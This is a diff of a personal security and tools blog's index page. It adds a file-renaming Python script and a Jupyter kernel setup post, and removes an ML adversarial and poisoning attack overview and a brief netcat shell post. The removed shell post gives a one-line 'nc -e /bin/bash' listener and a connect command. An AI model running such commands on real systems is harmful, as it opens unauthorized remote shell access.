@@ -156,6 +156,166 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Tools/%E5%A2%9E%E5%8A%A0%E6%97%B6%E9%97%B4%E6%88%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Tools/%E5%A2%9E%E5%8A%A0%E6%97%B6%E9%97%B4%E6%88%B3/" class="post-title-link" itemprop="url">增加时间戳脚本</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-17 14:19:49" itemprop="dateCreated datePublished" datetime="2020-03-17T14:19:49+08:00">2020-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-04 03:03:56" itemprop="dateModified" datetime="2022-06-04T03:03:56+08:00">2022-06-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tools/" itemprop="url" rel="index"><span itemprop="name">Tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">path=os.getcwd()</span><br><span class="line">newpath=<span class="string">&quot;_posts&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TimeStampToTime</span>(<span class="params">timestamp</span>):</span><br><span class="line">    timeStruct = time.localtime(timestamp)</span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,timeStruct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileCreateTime</span>(<span class="params">file</span>):</span><br><span class="line">    t = os.path.getctime(file)</span><br><span class="line">    ctime=TimeStampToTime(t)</span><br><span class="line">    <span class="keyword">return</span> ctime[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_files</span>(<span class="params">path</span>):</span><br><span class="line">    filelist=os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">        filename=file.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        os.rename(file,filename[<span class="number">0</span>]+<span class="string">&#x27;.md&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(filename[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#def note_code(path):</span></span><br><span class="line"></span><br><span class="line">rename_files(path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Tools/jupyter%E5%A2%9E%E5%8A%A0%E5%86%85%E6%A0%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Tools/jupyter%E5%A2%9E%E5%8A%A0%E5%86%85%E6%A0%B8/" class="post-title-link" itemprop="url">jupyter增加内核</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-17 14:19:49" itemprop="dateCreated datePublished" datetime="2020-03-17T14:19:49+08:00">2020-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-04 03:03:56" itemprop="dateModified" datetime="2022-06-04T03:03:56+08:00">2022-06-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tools/" itemprop="url" rel="index"><span itemprop="name">Tools</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在Python3下安装好jupyter后</p>
+<h2 id="1-设置jupyter的默认运行路径"><a href="#1-设置jupyter的默认运行路径" class="headerlink" title="1.设置jupyter的默认运行路径"></a>1.设置jupyter的默认运行路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --generate-config`</span><br><span class="line">C:\Users[用户名].jupyter\jupyter_notebook_config.py</span><br></pre></td></tr></table></figure>
+<p>找到 #c.NotebookApp.notebook_dir = ‘’，去掉该行前面的“#”；在这里设置路径</p>
+<h2 id="2-安装Python2内核"><a href="#2-安装Python2内核" class="headerlink" title="2.安装Python2内核"></a>2.安装Python2内核</h2><blockquote>
+<p>在我的电脑上是python2.7和python3.9。其中python2.7下的python.exe被我重命名为python2。</p>
+</blockquote>
+<p>2.1 在python2下安装ipykernel</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/categories/Tools/jupyter%E5%A2%9E%E5%8A%A0%E5%86%85%E6%A0%B8/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/%E5%B7%A5%E5%85%B7%E7%9A%84%E5%90%AF%E5%8A%A8%E9%85%8D%E7%BD%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -887,187 +1047,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/PoisonAttack02/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/PoisonAttack02/" class="post-title-link" itemprop="url">PoisonAttack02</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2019-03-18 15:37:05" itemprop="dateCreated datePublished" datetime="2019-03-18T15:37:05+08:00">2019-03-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-04 03:03:56" itemprop="dateModified" datetime="2022-06-04T03:03:56+08:00">2022-06-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="现有攻击方法"><a href="#现有攻击方法" class="headerlink" title="现有攻击方法"></a>现有攻击方法</h1><h2 id="对抗性攻击"><a href="#对抗性攻击" class="headerlink" title="对抗性攻击"></a>对抗性攻击</h2><blockquote>
-<p>借助子模型模仿（偷取）目标模型生成对抗样本（具有可迁移性，使本地子模型分类错误的样本也可以适用于目标模型。）进行攻击。</p>
-</blockquote>
-<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>训练得到的<code>模型边界</code>与真实的<code>决策边界</code><strong>不一致</strong>。</p>
-<p>(因为用于训练的原始样本集不可能将所有情况都涵盖。)</p>
-<p><img src="/categories/ML/PoisonAttack02/clip_image002-1646984526510.gif" alt="img" style="zoom:50%;"></p>
-<p>模型训练的边界与真实决策边界之间的空间就是对抗样本的空间。根据特征的梯度方向对样本特征进行改变，使得样本逐渐绕过边界。</p>
-<p>缺陷：需要攻击者在目标模型上<strong>进行大量的查询</strong>来获得<strong>大量反馈</strong>。</p>
-<h4 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h4><ul>
-<li>微笑着面对它（主动防御）。训练阶段就使用对抗样本来训练模型，让模型更加健壮。</li>
-<li>请求帮助（被动防御）。正式运行后，构建辅助网络，预测输入样本是对抗样本的概率。</li>
-</ul>
-<h2 id="投毒攻击"><a href="#投毒攻击" class="headerlink" title="投毒攻击"></a>投毒攻击</h2><p>分类：针对目标的攻击、无差别投毒攻击、后门。</p>
-<ul>
-<li>无差别投毒攻击：旨在破坏模型的可用性</li>
-<li>目标性投毒：旨在通过投毒使得某一个或者某一类样本能躲避模型的检测。</li>
-</ul>
-<h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>无差别投毒攻击：<strong>伪造错误数据</strong>或者<strong>修改数据标签</strong>后，模型抓取到的数据是虚假的或者错误的，用人话说就是模型的世界观被歪曲或者颠倒了。</p>
-<ul>
-<li>缺陷：需要控制样本标签；模型整个不可用了，易被发现</li>
-</ul>
-<p>针对性投毒攻击：通过给样本添加目标标签对应的特征，让它<strong>绕过模型的边界</strong>。</p>
-<ul>
-<li>缺陷：针对特定的样本，不能通用。</li>
-</ul>
-<p><img src="/categories/ML/PoisonAttack02/clip_image002.gif" alt="img" style="zoom:50%;"></p>
-<p>后门：让模型有后门。对于干净的数据集进行分类，只有遇到特定标记的样本时才会触发后门。</p>
-<ul>
-<li>缺陷：需要控制样本标签；</li>
-</ul>
-<p><img src="/categories/ML/PoisonAttack02/image-20220311160926060.png" alt="image-20220311160926060"></p>
-<h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><p>与对抗性攻击的防御类似。训练之前预先过滤，检测剔除可疑样本；</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Linux/%E5%8F%8D%E5%BC%B9shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Linux/%E5%8F%8D%E5%BC%B9shell/" class="post-title-link" itemprop="url">反弹shell</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2019-03-11 19:59:30" itemprop="dateCreated datePublished" datetime="2019-03-11T19:59:30+08:00">2019-03-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-06-04 03:03:56" itemprop="dateModified" datetime="2022-06-04T03:03:56+08:00">2022-06-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h2><p>先虚拟机再主机</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.93.135 7777</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1139,7 +1118,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">137</span>
+          <span class="site-state-item-count">139</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1151,7 +1130,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-count">55</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
